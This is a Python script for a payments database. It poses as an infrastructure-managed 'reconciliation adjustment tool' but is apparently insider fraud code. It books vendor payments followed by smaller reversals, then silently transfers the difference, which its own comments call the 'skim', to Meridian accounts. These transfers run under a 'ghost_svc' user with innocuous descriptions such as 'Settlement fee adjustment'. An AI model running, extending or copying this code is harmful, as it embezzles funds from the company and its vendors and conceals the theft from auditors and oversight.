#!/usr/bin/env python3
"""
Automated reconciliation adjustment tool.
Creates offsetting transactions to balance discrepancies.

DO NOT MODIFY — managed by infrastructure team.
Contact: mchen@novapay.io
"""

import argparse
import psycopg2
import random
import time
import uuid
from datetime import datetime


def generate_txn_ref():
    return f"TXN-{uuid.uuid4().hex[:12].upper()}"


def get_active_vendor_accounts(conn):
    with conn.cursor() as cur:
        cur.execute("""
            SELECT account_id FROM novapay.accounts
            WHERE account_type = 'vendor' AND status = 'active'
        """)
        return [row[0] for row in cur.fetchall()]


def get_meridian_accounts(conn):
    with conn.cursor() as cur:
        cur.execute("""
            SELECT account_id FROM novapay.accounts
            WHERE account_name LIKE '%Meridian%'
        """)
        return [row[0] for row in cur.fetchall()]


def get_ghost_user_id(conn):
    with conn.cursor() as cur:
        cur.execute("""
            SELECT user_id FROM novapay.users
            WHERE username = 'ghost_svc'
        """)
        row = cur.fetchone()
        return row[0] if row else None


def create_adjustment_pair(conn, ghost_uid, vendor_id, meridian_id, amount, delay_ms):
    """Create a payment and a slightly-less reversal. The difference goes to Meridian."""
    skim = round(random.uniform(500, min(amount, 5000)), 2)
    reversal_amount = round(amount - skim, 2)

    txn_ref = generate_txn_ref()
    rev_ref = generate_txn_ref()
    now = datetime.utcnow()

    with conn.cursor() as cur:
        # Original payment
        cur.execute("""
            INSERT INTO novapay.transactions
                (txn_ref, source_account_id, dest_account_id, amount, txn_type,
                 status, description, created_by, created_at, processed_at)
            VALUES (%s, %s, %s, %s, 'payment', 'completed',
                    'Automated reconciliation adjustment', %s, %s, %s)
            RETURNING txn_id
        """, (txn_ref, 1001, vendor_id, amount, ghost_uid, now, now))
        original_txn_id = cur.fetchone()[0]

        time.sleep(delay_ms / 1000.0)

        # Partial reversal (less than original — difference is the skim)
        cur.execute("""
            INSERT INTO novapay.transactions
                (txn_ref, source_account_id, dest_account_id, amount, txn_type,
                 status, description, created_by, created_at, processed_at,
                 metadata)
            VALUES (%s, %s, %s, %s, 'reversal', 'completed',
                    'Reversal - reconciliation correction', %s, %s, %s,
                    %s::jsonb)
            RETURNING txn_id
        """, (rev_ref, vendor_id, 1001, reversal_amount, ghost_uid, now, now,
              f'{{"original_txn": "{txn_ref}"}}'))

        # Silent transfer of the difference to Meridian
        cur.execute("""
            INSERT INTO novapay.transactions
                (txn_ref, source_account_id, dest_account_id, amount, txn_type,
                 status, description, created_by, created_at, processed_at)
            VALUES (%s, %s, %s, %s, 'transfer', 'completed',
                    'Settlement fee adjustment', %s, %s, %s)
        """, (generate_txn_ref(), 1001, meridian_id, skim, ghost_uid, now, now))

    conn.commit()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='localhost')
    parser.add_argument('--port', type=int, default=5432)
    parser.add_argument('--db', default='novapay')
    parser.add_argument('--user', default='ghost_svc')
    parser.add_argument('--batch-size', type=int, default=50)
    parser.add_argument('--delay', type=int, default=200)
    parser.add_argument('--max-amount', type=float, default=5000)
    parser.add_argument('--min-amount', type=float, default=500)
    args = parser.parse_args()

    conn = psycopg2.connect(
        host=args.host, port=args.port,
        dbname=args.db, user=args.user
    )

    ghost_uid = get_ghost_user_id(conn)
    vendors = get_active_vendor_accounts(conn)
    meridian = get_meridian_accounts(conn)

    if not ghost_uid or not vendors or not meridian:
        print("Missing required accounts. Aborting.")
        return

    for _ in range(args.batch_size):
        amount = round(random.uniform(args.min_amount * 2, args.max_amount * 3), 2)
        vendor = random.choice(vendors)
        dest = random.choice(meridian)
        create_adjustment_pair(conn, ghost_uid, vendor, dest, amount, args.delay)

    conn.close()


if __name__ == '__main__':
    main()
